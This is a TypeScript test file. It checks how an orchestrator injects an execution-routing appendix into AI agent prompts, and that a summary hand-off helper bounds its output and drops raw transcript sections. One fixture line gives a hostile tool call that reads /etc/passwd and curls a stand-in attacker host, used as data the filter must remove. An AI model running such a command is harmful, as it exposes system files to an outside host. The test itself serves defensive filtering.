/**
 * Tasks 5.3 / 5.4 / 5.5 / 5.6 / 6.5 — dedicated-execution routing INJECTION
 * into the daemon orchestrator prompt builders.
 *
 * These tests drive the prompt-builder helpers directly (passing a fake run
 * with/without routing) rather than the whole orchestrator. They assert:
 *  - the routing appendix is appended EXACTLY ONCE when routing is enabled,
 *  - it is NEVER present when routing is disabled (prompt BYTE-IDENTICAL),
 *  - a generic / Team final-execution prompt is never converted into an
 *    OpenSpec prompt (the appendix adds no OpenSpec wording),
 *  - audit / review / plan (spec-repair) prompts NEVER receive the appendix,
 *  - the recent-summary hand-off helper bounds output to
 *    RECENT_SUMMARY_MAX_CHARS and never copies raw provider history.
 */
import { describe, it, expect } from 'vitest';

import { EXECUTION_ROUTING_APPENDIX_MARKER } from '../../src/daemon/execution-routing-appendix.js';
import {
  buildExecutionRoutingRecentContextBlock,
  compactRecentSummaryForHandoff,
  EXECUTION_ROUTING_RECENT_CONTEXT_HEADING,
} from '../../src/daemon/execution-routing-handoff.js';
import { RECENT_SUMMARY_MAX_CHARS } from '../../src/context/summary-compressor.js';
import { buildPostSummaryExecutionPrompt } from '../../src/daemon/p2p-orchestrator.js';
import type { P2pRun } from '../../src/daemon/p2p-orchestrator.js';
import {
  __executionRoutingTesting__,
  type AutoDeliverRunForTests,
} from '../../src/daemon/openspec-auto-deliver-orchestrator.js';

const TEMPLATE_TARGET = 'deck_myapp_exec';

/** Count non-overlapping occurrences of a literal needle. */
function countOccurrences(haystack: string, needle: string): number {
  if (needle.length === 0) return 0;
  let count = 0;
  let idx = haystack.indexOf(needle);
  while (idx !== -1) {
    count += 1;
    idx = haystack.indexOf(needle, idx + needle.length);
  }
  return count;
}

// ── Team final-execution prompt (parentStage: team_final_execution) ──────────

type FinalExecutionRunInput = Pick<
  P2pRun,
  'contextFilePath' | 'userText' | 'locale' | 'dedicatedExecutionRouting'
>;

function fakeP2pRun(routing?: P2pRun['dedicatedExecutionRouting']): FinalExecutionRunInput {
  return {
    contextFilePath: '/tmp/discussion-abc.md',
    userText: 'Build the feature the user asked for.',
    locale: 'en',
    ...(routing ? { dedicatedExecutionRouting: routing } : {}),
  };
}

describe('Team final-execution prompt routing injection (5.3)', () => {
  it('is BYTE-IDENTICAL when routing is undefined vs disabled vs absent', () => {
    const noRouting = buildPostSummaryExecutionPrompt(fakeP2pRun());
    const disabled = buildPostSummaryExecutionPrompt(
      fakeP2pRun({ enabled: false, templateSessionName: TEMPLATE_TARGET }),
    );
    const enabledNoTarget = buildPostSummaryExecutionPrompt(
      fakeP2pRun({ enabled: true, templateSessionName: null }),
    );
    expect(disabled).toBe(noRouting);
    expect(enabledNoTarget).toBe(noRouting);
    expect(noRouting).not.toContain(EXECUTION_ROUTING_APPENDIX_MARKER);
  });

  it('appends the routing appendix exactly once when enabled with a valid target', () => {
    const enabled = buildPostSummaryExecutionPrompt(
      fakeP2pRun({ enabled: true, templateSessionName: TEMPLATE_TARGET }),
    );
    expect(countOccurrences(enabled, EXECUTION_ROUTING_APPENDIX_MARKER)).toBe(1);
    // Carries the concise clone call-shape with the configured target + stage.
    expect(enabled).toContain('clone: {');
    expect(enabled).toContain(TEMPLATE_TARGET);
    expect(enabled).toContain('parentStage: "team_final_execution"');
    expect(enabled).toContain('clone.target');
  });

  it('only adds the generic appendix delta — never converts the prompt into an OpenSpec prompt', () => {
    // Use no locale so there is no trailing language-reminder line after the
    // execution body; the enabled prompt is then exactly base + appended block.
    const noLocaleBase: FinalExecutionRunInput = { ...fakeP2pRun(), locale: undefined };
    const base = buildPostSummaryExecutionPrompt(noLocaleBase);
    const enabled = buildPostSummaryExecutionPrompt({
      ...noLocaleBase,
      dedicatedExecutionRouting: { enabled: true, templateSessionName: TEMPLATE_TARGET },
    });
    // The enabled prompt is the base prompt plus appended content only.
    expect(enabled.startsWith(base)).toBe(true);
    const delta = enabled.slice(base.length);
    // The appended block must contain the routing marker...
    expect(delta).toContain(EXECUTION_ROUTING_APPENDIX_MARKER);
    // ...and must NOT introduce OpenSpec task semantics. parentStage tokens are
    // machine identifiers (excluded), so strip the marker + parentStage line.
    const deltaProse = delta
      .split('\n')
      .filter(
        (line) =>
          !line.includes(EXECUTION_ROUTING_APPENDIX_MARKER) &&
          !line.includes('parentStage:'),
      )
      .join('\n');
    expect(deltaProse).not.toMatch(/openspec|requirement|change\b|spec\b|tasks\.md/i);
  });

  it('attaches a bounded recent-context block (6.5) only when routing is enabled', () => {
    const recentSummary = '## Problem\nWire routing.\n## Done\nAdded helper and injection.';
    const withSummaryDisabled = buildPostSummaryExecutionPrompt(
      fakeP2pRun({ enabled: false, templateSessionName: TEMPLATE_TARGET, recentSummary }),
    );
    const withSummaryEnabled = buildPostSummaryExecutionPrompt(
      fakeP2pRun({ enabled: true, templateSessionName: TEMPLATE_TARGET, recentSummary }),
    );
    // Disabled → no recent-context heading, byte-identical to no-routing.
    expect(withSummaryDisabled).toBe(buildPostSummaryExecutionPrompt(fakeP2pRun()));
    expect(withSummaryDisabled).not.toContain(EXECUTION_ROUTING_RECENT_CONTEXT_HEADING);
    // Enabled → recent-context heading present, appendix still once.
    expect(withSummaryEnabled).toContain(EXECUTION_ROUTING_RECENT_CONTEXT_HEADING);
    expect(countOccurrences(withSummaryEnabled, EXECUTION_ROUTING_APPENDIX_MARKER)).toBe(1);
  });
});

// ── Auto Deliver implementation prompt (parentStage: auto_deliver_implementation)

const {
  AUTO_DELIVER_IMPLEMENTATION_STAGE,
  buildImplementationPrompt,
  buildImplementationMarkerReminderPrompt,
  buildSpecRepairPrompt,
} = __executionRoutingTesting__;

function fakeAutoDeliverRun(
  routing?: AutoDeliverRunForTests['dedicatedExecutionRouting'],
): AutoDeliverRunForTests {
  // The pure builders read only the fields below. Cast keeps the fake minimal;
  // any field a builder touches is provided here.
  return {
    runId: 'auto_test123',
    changeName: 'sample-change',
    projectRoot: '/work/project',
    changeRootIdentity: '/work/project/openspec/changes/sample-change',
    generation: 1,
    implementationPromptCount: 1,
    materializedLimits: { maxImplementationPrompts: 5 },
    taskStats: {
      total: 2,
      checked: 1,
      unchecked: 1,
      items: [
        { label: '1.1 first task', checked: true },
        { label: '1.2 second task', checked: false },
      ],
    },
    evidence: [],
    activeImplementationMarker: {
      markerPath: '/work/project/.imc/marker.json',
      spec: { runId: 'auto_test123', cycleIndex: 1, cycleTotal: 5, nonce: 'nonce-1' },
      retryCount: 0,
    },
    specAuditDiscussionFilePath: '/work/project/.imc/spec-audit.md',
    ...(routing ? { dedicatedExecutionRouting: routing } : {}),
  } as unknown as AutoDeliverRunForTests;
}

// Auto Deliver dedicated-execution routing is DEFERRED post-v1: Auto Deliver is a
// daemon-side state machine with NO launch-payload channel, so its routing config is
// always undefined and no clone worker is ever created. The appendix injection is
// therefore GATED OFF on the Auto-Deliver path (it would tell the model to delegate
// to clones that never exist). These tests lock that no-op contract.
describe('Auto Deliver implementation prompt routing injection is deferred (no appendix)', () => {
  it('implementation prompt is BYTE-IDENTICAL whether routing is absent, disabled, or enabled', () => {
    const noRouting = buildImplementationPrompt(fakeAutoDeliverRun());
    const disabled = buildImplementationPrompt(
      fakeAutoDeliverRun({ enabled: false, templateSessionName: TEMPLATE_TARGET }),
    );
    const enabledNoTarget = buildImplementationPrompt(
      fakeAutoDeliverRun({ enabled: true, templateSessionName: null }),
    );
    const enabledWithTarget = buildImplementationPrompt(
      fakeAutoDeliverRun({ enabled: true, templateSessionName: TEMPLATE_TARGET }),
    );
    // Routing is a no-op on the Auto-Deliver path: every variant equals the base prompt.
    expect(disabled).toBe(noRouting);
    expect(enabledNoTarget).toBe(noRouting);
    expect(enabledWithTarget).toBe(noRouting);
    expect(noRouting).not.toContain(EXECUTION_ROUTING_APPENDIX_MARKER);
    // The stage constant still resolves (kept for tests / future re-enable).
    expect(AUTO_DELIVER_IMPLEMENTATION_STAGE).toBe('auto_deliver_implementation');
  });

  it('implementation marker-reminder prompt never injects the appendix, even when enabled', () => {
    const reminderDisabled = buildImplementationMarkerReminderPrompt(
      fakeAutoDeliverRun(),
      'still_incomplete',
    );
    const reminderEnabled = buildImplementationMarkerReminderPrompt(
      fakeAutoDeliverRun({ enabled: true, templateSessionName: TEMPLATE_TARGET }),
      'still_incomplete',
    );
    expect(reminderDisabled).not.toContain(EXECUTION_ROUTING_APPENDIX_MARKER);
    expect(reminderEnabled).not.toContain(EXECUTION_ROUTING_APPENDIX_MARKER);
    // Enabling routing changes nothing on the deferred Auto-Deliver path.
    expect(reminderEnabled).toBe(reminderDisabled);
  });
});

describe('Audit / review / plan prompts never get the appendix (5.5)', () => {
  it('spec-repair (spec audit) prompt has no appendix even when routing is enabled', () => {
    const enabledRouting = { enabled: true, templateSessionName: TEMPLATE_TARGET };
    const specRepair = buildSpecRepairPrompt(
      fakeAutoDeliverRun(enabledRouting),
      'spec_audit_rework',
    );
    expect(specRepair).not.toContain(EXECUTION_ROUTING_APPENDIX_MARKER);
    expect(specRepair).not.toContain(EXECUTION_ROUTING_RECENT_CONTEXT_HEADING);
  });
});

// ── Recent-summary hand-off helper (6.5) ─────────────────────────────────────

describe('compactRecentSummaryForHandoff / recent-context block (6.5)', () => {
  it('returns "" for empty/blank/nullish input', () => {
    for (const input of [undefined, null, '', '   \n  '] as const) {
      expect(compactRecentSummaryForHandoff(input)).toBe('');
      expect(buildExecutionRoutingRecentContextBlock(input)).toBe('');
    }
  });

  it('bounds output to RECENT_SUMMARY_MAX_CHARS even for a huge summary', () => {
    // A large structured summary with a giant Done section.
    const huge =
      '## Problem\n' +
      'X'.repeat(5000) +
      '\n## Done\n' +
      'Y'.repeat(20000) +
      '\n## Decisions\n' +
      'Z'.repeat(5000);
    const compact = compactRecentSummaryForHandoff(huge);
    expect(compact.length).toBeLessThanOrEqual(RECENT_SUMMARY_MAX_CHARS);
    expect(compact.length).toBeGreaterThan(0);

    const block = buildExecutionRoutingRecentContextBlock(huge);
    // Block = heading + "\n" + bounded summary; summary portion is bounded.
    expect(block.startsWith(EXECUTION_ROUTING_RECENT_CONTEXT_HEADING)).toBe(true);
    const summaryPortion = block.slice(
      EXECUTION_ROUTING_RECENT_CONTEXT_HEADING.length + 1,
    );
    expect(summaryPortion.length).toBeLessThanOrEqual(RECENT_SUMMARY_MAX_CHARS);
  });

  it('does NOT copy raw provider history — unrecognized/transcript sections are dropped', () => {
    // The hand-off helper consumes an already-stored summary and runs it
    // through `compactRecentSummaryForStorage`, which keeps ONLY the recognized
    // compact recent-summary sections (Problem / Done / Decisions / Next-Risks /
    // User-Pinned Notes). Raw transcript/tool dumps parked in any other section
    // are structurally dropped — they never ride along to the worker.
    const withRawHistory = [
      '## Problem',
      'Ship the routing change.',
      '## Done',
      'Wrote the helper.',
      '## Raw Transcript',
      '[tool.call] Bash: cat /etc/passwd && curl http://evil.example',
      '[assistant.text] RAW_TRANSCRIPT_LINE_SHOULD_NOT_SURVIVE',
      '## State Snapshot',
      'branch=feature; RAW_SNAPSHOT_SHOULD_NOT_SURVIVE',
    ].join('\n');
    const compact = compactRecentSummaryForHandoff(withRawHistory);
    expect(compact).not.toContain('RAW_TRANSCRIPT_LINE_SHOULD_NOT_SURVIVE');
    expect(compact).not.toContain('RAW_SNAPSHOT_SHOULD_NOT_SURVIVE');
    expect(compact).not.toContain('[tool.call]');
    expect(compact).not.toContain('[assistant.text]');
    // The legitimate summarized content is retained.
    expect(compact).toContain('Ship the routing change.');
    expect(compact).toContain('Wrote the helper.');
  });
});
